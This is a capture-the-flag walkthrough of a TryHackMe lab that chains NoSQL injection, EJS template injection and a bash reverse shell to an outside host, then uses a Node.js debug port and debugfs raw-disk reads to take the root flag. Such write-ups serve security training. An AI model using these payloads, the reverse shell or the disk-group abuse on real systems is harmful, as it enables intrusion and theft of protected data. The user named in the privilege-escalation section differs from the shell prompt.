# Do Not Disturb

<img width="1902" height="349" alt="image" src="https://github.com/user-attachments/assets/f996833a-c436-4094-ae7d-a3ef26cf41ca" />

---

## namp scan 

```
┌──(kali㉿kali)-[~/tryhackme/Do_Not_Disturb]
└─$ nmap -sCV -Pn 10.112.189.252
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-07 06:28 UTC
Nmap scan report for 10.112.189.252
Host is up (0.069s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0a:32:88:5a:10:50:30:fe:d5:bc:d5:2b:ab:52:e1:ee (ECDSA)
|_  256 7f:be:96:c8:0d:86:2f:c6:53:bc:e8:22:bb:d1:e0:41 (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title: Byte Lotus &mdash; Poolside
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.78 seconds
                                                                                                                                                                                       
┌──(kali㉿kali)-[~/tryhackme/Do_Not_Disturb]

```

## website 

<img width="1919" height="779" alt="image" src="https://github.com/user-attachments/assets/24882c46-8d33-403c-8bca-f3907977fd4c" />

## i try sqli but not work let's try Nosqli

```
Set-Cookie: connect.sid=s%3AtEavM-WgNxAKYmOjSSUc36SxUd243sZC.qpEhG5u6BQgEu4A2Emf5sXstBr0QKg9BEzxes7f4y%2BE; 
```

<img width="1613" height="477" alt="image" src="https://github.com/user-attachments/assets/7a7ab790-e62e-4cd4-8482-b40a5cb0e0af" />

## let's send request to /staff with this cookie

<img width="1018" height="495" alt="image" src="https://github.com/user-attachments/assets/0e1d5635-b628-402a-9833-68d8352bb86a" />

## look there is SSTI in `/staff/priview`

```
template=<%= require('child_process').execSync('id').toString() %>
```

<img width="1220" height="648" alt="image" src="https://github.com/user-attachments/assets/4454a50a-ec2a-4705-b11a-74981582901c" />

## good first flag

```
curl -X POST http://10.112.189.252/staff/preview \
  -H "Cookie: connect.sid=s%3AtEavM-WgNxAKYmOjSSUc36SxUd243sZC.qpEhG5u6BQgEu4A2Emf5sXstBr0QKg9BEzxes7f4y%2BE" \
  -d "template=<%= global.process.mainModule.require('child_process').execSync('cat /home/*/user.txt 2>/dev/null').toString() %>"

```

> ### bingo we got first flag 🚩

## priv esc

```
template=<%= global.process.mainModule.require('child_process').spawn('bash', ['-c', 'bash -i >& /dev/tcp/192.168.134.38/4444 0>&1']).unref() %>
```

<img width="1423" height="413" alt="image" src="https://github.com/user-attachments/assets/5b4cd047-3ee6-42a3-8655-ff73f1e6b38d" />

## found Node.js Debug Port!

```
ss -tlnu
```

```
poolside@tryhackme-2404:~$ ss -tlnu
ss -tlnu
Netid State  Recv-Q Send-Q       Local Address:Port Peer Address:PortProcess
udp   UNCONN 0      0               127.0.0.54:53        0.0.0.0:*          
udp   UNCONN 0      0            127.0.0.53%lo:53        0.0.0.0:*          
udp   UNCONN 0      0      10.112.189.252%ens5:68        0.0.0.0:*          
tcp   LISTEN 0      4096            127.0.0.54:53        0.0.0.0:*          
tcp   LISTEN 0      511              127.0.0.1:9229      0.0.0.0:*          
tcp   LISTEN 0      4096               0.0.0.0:22        0.0.0.0:*          
tcp   LISTEN 0      4096         127.0.0.53%lo:53        0.0.0.0:*          
tcp   LISTEN 0      4096                  [::]:22           [::]:*          
tcp   LISTEN 0      511                      *:80              *:*          
poolside@tryhackme-2404:~$ 

```

---

The `pipelinesvc` user was in the `disk` group (gid=6). This group has direct read/write access to raw disk devices (`/dev/nvme0n1p1`).

### Why This Worked

1.  `disk` Group Privileges: Members of the `disk` group can read and write directly to disk blocks, bypassing file system permissions.

2.  `debugfs` Tool: This tool allows reading ext2/ext3/ext4 filesystems directly from the raw disk device.

3.  Bypassing File Permissions: Even though `root.txt` was readable only by root, we bypassed this by reading the raw disk data:

bash

/usr/sbin/debugfs -R "cat /root/root.txt" /dev/nvme0n1p1

This command:

-   Opens the raw disk partition `/dev/nvme0n1p1`

-   Uses `debugfs` to read the filesystem metadata

-   Returns the contents of `/root/root.txt` without checking file permissions

## open node n debug mode

```
node inspect localhost:9229
```

## run

```
exec process.mainModule.require('child_process').execSync('/usr/sbin/debugfs -R "cat /root/root.txt" /dev/nvme0n1p1 2>/dev/null').toString()
```

<img width="1420" height="122" alt="image" src="https://github.com/user-attachments/assets/a4892bcd-a30f-4d01-9924-4bf80a0d16a9" />

